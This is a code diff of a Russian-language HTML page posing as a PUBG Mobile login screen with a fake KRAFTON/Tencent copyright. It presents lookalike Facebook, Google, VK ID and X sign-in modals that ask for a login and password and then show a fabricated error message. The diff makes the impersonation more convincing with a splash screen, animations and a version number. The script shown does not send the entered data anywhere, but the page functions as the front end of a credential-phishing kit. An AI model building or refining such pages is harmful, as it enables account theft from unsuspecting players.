@@ -2,184 +2,285 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG MOBILE Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PUBG MOBILE - Global 2026</title>
     <link href="fonts.googleapis.com" rel="stylesheet">
     <style>
-        /* БАЗОВЫЙ СТИЛЬ ИГРЫ */
-        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Roboto', sans-serif; background: #000; overflow: hidden; }
-        .bg { position: fixed; width: 100%; height: 100%; background: url('w.forfun.com') center/cover; z-index: -1; }
-        .overlay { position: absolute; width: 100%; height: 100%; background: radial-gradient(circle, transparent, rgba(0,0,0,0.9)); }
-        
-        .main-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; gap: 40px; position: relative; z-index: 1; }
-        .logo { width: 240px; }
-        .social-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; width: 320px; }
-        .s-btn { display: flex; align-items: center; justify-content: center; height: 50px; border-radius: 5px; color: #fff; font-family: 'Bebas Neue'; font-size: 18px; cursor: pointer; border: 1px solid rgba(255,255,255,0.1); }
-        .s-btn img { width: 20px; margin-right: 10px; }
-        
-        /* Цвета кнопок */
-        .fb-btn { background: #1877f2; }
-        .tw-btn { background: #000; border-color: #333; } /* Стиль X (Twitter) 2026 */
-        .gp-btn { background: #fff; color: #757575; }
-        .vk-btn { background: #0077ff; }
+        :root {
+            --pubg-gold: #f3ab18;
+            --fb-blue: #1877f2;
+            --gp-blue: #1a73e8;
+            --vk-blue: #0077ff;
+            --x-black: #000000;
+        }
 
-        /* МОДАЛЬНЫЕ ОКНА (ОБЩЕЕ) */
-        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; align-items: center; justify-content: center; z-index: 100; }
-        .login-box { width: 100%; max-width: 400px; border-radius: 8px; overflow: hidden; animation: zoomIn 0.2s; position: relative; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Roboto', sans-serif; background: #000; overflow: hidden; color: #fff; }
+
+        /* --- ПРЕДЗАГРУЗКА (SPLASH SCREEN) --- */
+        #splash {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            z-index: 10000; transition: opacity 0.8s ease;
+        }
+        .splash-logo { width: 200px; animation: pulseLogo 2s infinite; }
+        .loading-bar { width: 200px; height: 4px; background: #333; margin-top: 20px; border-radius: 2px; overflow: hidden; }
+        .loading-progress { width: 0%; height: 100%; background: var(--pubg-gold); animation: load 2.5s forwards; }
+
+        /* --- ФОН С ЭФФЕКТОМ ГЛУБИНЫ --- */
+        .bg-layer {
+            position: fixed; top: -5%; left: -5%; width: 110%; height: 110%;
+            background: url('w.forfun.com') center/cover;
+            transition: transform 0.1s ease-out; z-index: -1;
+        }
+        .vignette {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle, transparent 20%, rgba(0,0,0,0.7) 80%, #000 100%);
+            z-index: 0;
+        }
+
+        /* --- ГЛАВНЫЙ ИНТЕРФЕЙС --- */
+        .ui-wrapper {
+            position: relative; z-index: 10; height: 100vh; display: flex;
+            flex-direction: column; align-items: center; justify-content: space-between;
+            padding: 50px 20px; animation: fadeIn 1s 2.6s both;
+        }
+        .main-logo { width: 280px; filter: drop-shadow(0 0 20px rgba(243,171,24,0.4)); }
+
+        .btn-container { width: 100%; max-width: 360px; display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .login-btn {
+            height: 54px; border-radius: 6px; display: flex; align-items: center; justify-content: center;
+            cursor: pointer; transition: all 0.2s; border: 1px solid rgba(255,255,255,0.1);
+            font-family: 'Bebas Neue', cursive; font-size: 20px; letter-spacing: 1px; position: relative; overflow: hidden;
+        }
+        .login-btn:active { transform: scale(0.92); }
+        .login-btn img { width: 24px; margin-right: 10px; }
+        .login-btn::after {
+            content: ''; position: absolute; top: 0; left: -100%; width: 50%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transform: skewX(-20deg); animation: shine 4s infinite;
+        }
+
+        .btn-fb { background: var(--fb-blue); }
+        .btn-gp { background: #fff; color: #757575; }
+        .btn-vk { background: var(--vk-blue); }
+        .btn-tw { background: #000; border-color: #333; }
+
+        /* --- МОДАЛЬНЫЕ ОКНА (АУТЕНТИЧНЫЕ) --- */
+        .modal-engine {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.92); display: none; align-items: center; justify-content: center; z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+        .auth-card { width: 100%; max-width: 420px; border-radius: 12px; position: relative; animation: cardIn 0.4s cubic-bezier(0.17, 0.89, 0.32, 1.27); }
         
-        /* СТИЛЬ FACEBOOK */
-        .box-fb { background: #f0f2f5; }
-        .header-fb { background: #1877f2; color: #fff; padding: 15px; text-align: center; font-weight: bold; }
+        /* Facebook Design */
+        .card-fb { background: #f0f2f5; color: #1c1e21; }
+        .head-fb { background: var(--fb-blue); color: #fff; padding: 15px; text-align: center; font-weight: 700; }
         
-        /* СТИЛЬ GOOGLE */
-        .box-gp { background: #fff; padding-bottom: 20px; }
-        .header-gp { padding: 40px 20px 20px; text-align: center; }
-        .header-gp img { width: 75px; }
-
-        /* СТИЛЬ VK */
-        .box-vk { background: #ebedf0; }
-        .header-vk { background: #fff; padding: 15px; text-align: center; border-bottom: 1px solid #dce1e6; color: #0077ff; font-weight: bold; }
-
-        /* СТИЛЬ TWITTER (X) */
-        .box-tw { background: #000; color: #fff; border: 1px solid #333; }
-        .header-tw { padding: 20px; text-align: center; font-size: 24px; }
-
-        /* ФОРМЫ */
-        .form-content { padding: 20px; display: flex; flex-direction: column; }
-        .form-content h2 { font-size: 18px; margin-bottom: 10px; text-align: center; color: inherit; }
-        input { padding: 12px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
-        .btn-next { padding: 12px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        /* Google Design */
+        .card-gp { background: #fff; color: #202124; padding: 40px 30px; text-align: center; }
+        .gp-logo { width: 74px; margin-bottom: 20px; }
         
-        .fb-next { background: #1877f2; color: #fff; }
-        .gp-next { background: #1a73e8; color: #fff; }
-        .vk-next { background: #0077ff; color: #fff; }
-        .tw-next { background: #fff; color: #000; }
+        /* X/Twitter Design */
+        .card-tw { background: #000; color: #fff; border: 1px solid #333; padding: 30px; }
+        .tw-logo-x { font-size: 35px; text-align: center; margin-bottom: 25px; }
 
-        .close { position: absolute; right: 10px; top: 10px; color: #999; cursor: pointer; font-size: 24px; z-index: 10; }
+        /* VK Design */
+        .card-vk { background: #ffffff; color: #000; }
+        .head-vk { padding: 15px; border-bottom: 1px solid #ebedf0; display: flex; justify-content: center; }
+
+        /* Ввод и кнопки */
+        .body-padd { padding: 25px; }
+        .input-group { position: relative; margin-bottom: 20px; }
+        input {
+            width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 6px;
+            font-size: 16px; outline: none; transition: border 0.3s;
+        }
+        input:focus { border-color: var(--pubg-gold); }
+        .action-btn {
+            width: 100%; padding: 14px; border: none; border-radius: 6px;
+            font-weight: 700; font-size: 16px; cursor: pointer; transition: filter 0.2s;
+        }
+        .action-btn:hover { filter: brightness(1.1); }
+
+        .close-mod { position: absolute; right: 15px; top: 12px; font-size: 28px; cursor: pointer; color: #999; z-index: 100; }
+
+        /* АНИМАЦИИ */
+        @keyframes load { to { width: 100%; } }
+        @keyframes pulseLogo { 0%, 100% { opacity: 0.5; transform: scale(0.95); } 50% { opacity: 1; transform: scale(1); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes shine { from { left: -100%; } to { left: 200%; } }
+        @keyframes cardIn { from { transform: translateY(100px) scale(0.9); opacity: 0; } to { transform: translateY(0) scale(1); opacity: 1; } }
+        
+        .slide-out { animation: slideOut 0.3s forwards; }
+        @keyframes slideOut { to { transform: translateX(-100%); opacity: 0; } }
+        .slide-in { animation: slideIn 0.3s forwards; }
+        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+
         .hidden { display: none; }
-
-        @keyframes zoomIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
     </style>
 </head>
 <body>
 
-<div class="bg"></div>
-<div class="overlay"></div>
-
-<div class="main-screen">
-    <img src="upload.wikimedia.org" class="logo">
-    <div class="social-btns">
-        <div class="s-btn fb-btn" onclick="openModal('fb')"><img src="cdn-icons-png.flaticon.com"> Facebook</div>
-        <div class="s-btn tw-btn" onclick="openModal('tw')"><img src="cdn-icons-png.flaticon.com"> Twitter</div>
-        <div class="s-btn gp-btn" onclick="openModal('gp')"><img src="cdn-icons-png.flaticon.com"> Google</div>
-        <div class="s-btn vk-btn" onclick="openModal('vk')"><img src="cdn-icons-png.flaticon.com"> VKontakte</div>
+    <!-- Сплэш-скрин -->
+    <div id="splash">
+        <img src="upload.wikimedia.org" class="splash-logo">
+        <div class="loading-bar"><div class="loading-progress"></div></div>
+        <p style="font-size: 12px; color: #666; margin-top: 10px; letter-spacing: 2px;">LOADING RESOURCES...</p>
     </div>
-</div>
 
-<!-- МОДАЛЬНЫЕ ОКНА -->
-<div id="overlay" class="modal-overlay">
-    
-    <!-- FACEBOOK BOX -->
-    <div id="mod-fb" class="login-box box-fb hidden">
-        <span class="close" onclick="closeAll()">×</span>
-        <div class="header-fb">Facebook</div>
-        <div class="form-content">
-            <h2 style="color:#1c1e21">Вход на Facebook</h2>
-            <div id="fb-step1">
-                <input type="text" placeholder="Мобильный номер или эл. адрес">
-                <button class="btn-next fb-next" onclick="nextStep('fb')">Далее</button>
-            </div>
-            <div id="fb-step2" class="hidden">
-                <input type="password" placeholder="Пароль">
-                <button class="btn-next fb-next" onclick="finish()">Войти</button>
-            </div>
+    <div class="bg-layer" id="parallaxBg"></div>
+    <div class="vignette"></div>
+
+    <div class="ui-wrapper">
+        <div style="text-align: right; width: 100%; color: var(--pubg-gold); font-size: 12px;">v4.2.0.19254</div>
+        
+        <img src="upload.wikimedia.org" class="main-logo">
+
+        <div class="btn-container">
+            <div class="login-btn btn-fb" onclick="openMod('fb')"><img src="cdn-icons-png.flaticon.com"> Facebook</div>
+            <div class="login-btn btn-gp" onclick="openMod('gp')"><img src="cdn-icons-png.flaticon.com"> Google</div>
+            <div class="login-btn btn-vk" onclick="openMod('vk')"><img src="cdn-icons-png.flaticon.com"> VKontakte</div>
+            <div class="login-btn btn-tw" onclick="openMod('tw')"><img src="cdn-icons-png.flaticon.com"> Twitter</div>
+        </div>
+
+        <div style="text-align: center; font-size: 10px; color: rgba(255,255,255,0.3); line-height: 1.5;">
+            By logging in, you agree to our <span style="text-decoration: underline;">Terms of Service</span> and <span style="text-decoration: underline;">Privacy Policy</span>.<br>
+            © 2026 KRAFTON, Inc. & Tencent Games.
         </div>
     </div>
 
-    <!-- GOOGLE BOX -->
-    <div id="mod-gp" class="login-box box-gp hidden">
-        <span class="close" onclick="closeAll()">×</span>
-        <div class="header-gp">
-            <img src="www.google.com">
-        </div>
-        <div class="form-content">
-            <h2 style="color:#202124; font-family: 'Roboto'">Вход</h2>
-            <p style="text-align:center; color:#202124">Используйте аккаунт Google</p>
-            <div id="gp-step1">
-                <input type="text" placeholder="Телефон или адрес эл. почты" style="border-radius: 4px; padding: 15px;">
-                <button class="btn-next gp-next" onclick="nextStep('gp')">Далее</button>
+    <!-- ДВИЖОК МОДАЛОК -->
+    <div id="modalOverlay" class="modal-engine">
+        
+        <!-- FACEBOOK -->
+        <div id="box-fb" class="auth-card card-fb hidden">
+            <span class="close-mod" onclick="closeMod()">×</span>
+            <div class="head-fb">facebook</div>
+            <div class="body-padd">
+                <div id="fb_1">
+                    <h2 style="font-size: 18px; text-align:center;">Вход в Facebook</h2>
+                    <input type="text" placeholder="Электронный адрес или номер телефона">
+                    <button class="action-btn" style="background: var(--fb-blue); color:#fff;" onclick="next('fb')">Далее</button>
+                </div>
+                <div id="fb_2" class="hidden">
+                    <h2 style="font-size: 18px; text-align:center;">Введите пароль</h2>
+                    <input type="password" placeholder="Пароль">
+                    <button class="action-btn" style="background: var(--fb-blue); color:#fff;" onclick="finish()">Войти</button>
+                </div>
             </div>
-            <div id="gp-step2" class="hidden">
-                <input type="password" placeholder="Введите пароль">
-                <button class="btn-next gp-next" onclick="finish()">Далее</button>
+        </div>
+
+        <!-- GOOGLE -->
+        <div id="box-gp" class="auth-card card-gp hidden">
+            <span class="close-mod" onclick="closeMod()">×</span>
+            <img src="www.google.com" class="gp-logo">
+            <div id="gp_1">
+                <h1 style="font-size: 24px; font-weight: 400; margin: 0;">Вход</h1>
+                <p style="margin: 10px 0 30px;">Используйте аккаунт Google</p>
+                <input type="text" placeholder="Адрес эл. почты или телефон" style="padding: 16px;">
+                <div style="text-align: right; margin-top: 40px;">
+                    <button class="action-btn" style="background: var(--gp-blue); color:#fff; width: 100px;" onclick="next('gp')">Далее</button>
+                </div>
+            </div>
+            <div id="gp_2" class="hidden">
+                <h1 style="font-size: 24px; font-weight: 400; margin: 0;">Добро пожаловать</h1>
+                <p style="margin: 10px 0 30px;">Введите ваш пароль</p>
+                <input type="password" placeholder="Пароль" style="padding: 16px;">
+                <div style="text-align: right; margin-top: 40px;">
+                    <button class="action-btn" style="background: var(--gp-blue); color:#fff; width: 100px;" onclick="finish()">Далее</button>
+                </div>
             </div>
         </div>
+
+        <!-- VK -->
+        <div id="box-vk" class="auth-card card-vk hidden">
+            <span class="close-mod" onclick="closeMod()">×</span>
+            <div class="head-vk"><img src="upload.wikimedia.org" width="35"></div>
+            <div class="body-padd">
+                <div id="vk_1">
+                    <h2 style="text-align:center; margin-bottom: 25px;">Вход в VK ID</h2>
+                    <input type="text" placeholder="Телефон или почта" style="background: #f2f3f5; border:none;">
+                    <button class="action-btn" style="background: var(--vk-blue); color:#fff; margin-top: 10px; border-radius: 10px;" onclick="next('vk')">Продолжить</button>
+                </div>
+                <div id="vk_2" class="hidden">
+                    <h2 style="text-align:center; margin-bottom: 25px;">Введите пароль</h2>
+                    <input type="password" placeholder="Ваш пароль" style="background: #f2f3f5; border:none;">
+                    <button class="action-btn" style="background: var(--vk-blue); color:#fff; margin-top: 10px; border-radius: 10px;" onclick="finish()">Войти</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- TWITTER (X) -->
+        <div id="box-tw" class="auth-card card-tw hidden">
+            <span class="close-mod" style="color:#fff" onclick="closeMod()">×</span>
+            <div class="tw-logo-x">𝕏</div>
+            <div id="tw_1">
+                <h2 style="margin-bottom: 20px;">Войти в 𝕏</h2>
+                <input type="text" placeholder="Электронная почта" style="background:#000; border: 1px solid #333; color:#fff;">
+                <button class="action-btn" style="background: #fff; color:#000; border-radius: 25px; margin-top: 20px;" onclick="next('tw')">Далее</button>
+            </div>
+            <div id="tw_2" class="hidden">
+                <h2 style="margin-bottom: 20px;">Введите пароль</h2>
+                <input type="password" placeholder="Пароль" style="background:#000; border: 1px solid #333; color:#fff;">
+                <button class="action-btn" style="background: #fff; color:#000; border-radius: 25px; margin-top: 20px;" onclick="finish()">Войти</button>
+            </div>
+        </div>
+
     </div>
 
-    <!-- VK BOX -->
-    <div id="mod-vk" class="login-box box-vk hidden">
-        <span class="close" onclick="closeAll()">×</span>
-        <div class="header-vk">ВКонтакте</div>
-        <div class="form-content">
-            <h2 style="color:#000">Вход в аккаунт</h2>
-            <div id="vk-step1">
-                <input type="text" placeholder="Телефон или email">
-                <button class="btn-next vk-next" onclick="nextStep('vk')">Продолжить</button>
-            </div>
-            <div id="vk-step2" class="hidden">
-                <input type="password" placeholder="Ваш пароль">
-                <button class="btn-next vk-next" onclick="finish()">Войти</button>
-            </div>
-        </div>
-    </div>
+    <script>
+        // Скрытие сплэш-скрина
+        window.onload = () => {
+            setTimeout(() => {
+                document.getElementById('splash').style.opacity = '0';
+                setTimeout(() => document.getElementById('splash').style.display = 'none', 800);
+            }, 2500);
+        };
 
-    <!-- TWITTER (X) BOX -->
-    <div id="mod-tw" class="login-box box-tw hidden">
-        <span class="close" onclick="closeAll()">×</span>
-        <div class="header-tw">𝕏</div>
-        <div class="form-content">
-            <h2>Войти в 𝕏</h2>
-            <div id="tw-step1">
-                <input type="text" placeholder="Телефон, электронная почта" style="background:#000; color:#fff; border:1px solid #333">
-                <button class="btn-next tw-next" onclick="nextStep('tw')">Далее</button>
-            </div>
-            <div id="tw-step2" class="hidden">
-                <input type="password" placeholder="Пароль" style="background:#000; color:#fff; border:1px solid #333">
-                <button class="btn-next tw-next" onclick="finish()">Войти</button>
-            </div>
-        </div>
-    </div>
-
-</div>
-
-<script>
-    const overlay = document.getElementById('overlay');
-    const boxes = ['fb', 'gp', 'vk', 'tw'];
-
-    function openModal(type) {
-        overlay.style.display = 'flex';
-        boxes.forEach(b => document.getElementById('mod-' + b).classList.add('hidden'));
-        document.getElementById('mod-' + type).classList.remove('hidden');
-    }
-
-    function closeAll() {
-        overlay.style.display = 'none';
-        boxes.forEach(b => {
-            document.getElementById(b + '-step1').classList.remove('hidden');
-            document.getElementById(b + '-step2').classList.add('hidden');
+        // Параллакс эффект
+        document.addEventListener('mousemove', (e) => {
+            const bg = document.getElementById('parallaxBg');
+            const x = (window.innerWidth / 2 - e.pageX) / 50;
+            const y = (window.innerHeight / 2 - e.pageY) / 50;
+            bg.style.transform = `translate(${x}px, ${y}px) scale(1.1)`;
         });
-    }
 
-    function nextStep(type) {
-        document.getElementById(type + '-step1').classList.add('hidden');
-        document.getElementById(type + '-step2').classList.remove('hidden');
-    }
+        const overlay = document.getElementById('modalOverlay');
+        const networks = ['fb', 'gp', 'vk', 'tw'];
 
-    function finish() {
-        alert("Ошибка авторизации. Попробуйте позже.");
-        closeAll();
-    }
-</script>
+        function openMod(net) {
+            overlay.style.display = 'flex';
+            networks.forEach(n => document.getElementById('box-' + n).classList.add('hidden'));
+            document.getElementById('box-' + net).classList.remove('hidden');
+        }
 
+        function closeMod() {
+            overlay.style.display = 'none';
+            networks.forEach(n => {
+                document.getElementById(n + '_1').classList.remove('hidden', 'slide-out');
+                document.getElementById(n + '_2').classList.add('hidden');
+                document.getElementById(n + '_2').classList.remove('slide-in');
+            });
+        }
+
+        function next(net) {
+            const s1 = document.getElementById(net + '_1');
+            const s2 = document.getElementById(net + '_2');
+            
+            s1.classList.add('slide-out');
+            setTimeout(() => {
+                s1.classList.add('hidden');
+                s2.classList.remove('hidden');
+                s2.classList.add('slide-in');
+            }, 300);
+        }
+
+        function finish() {
+            alert("Ошибка синхронизации данных (Area Code: 102). Пожалуйста, проверьте соединение.");
+            closeMod();
+        }
+    </script>
 </body>
 </html>
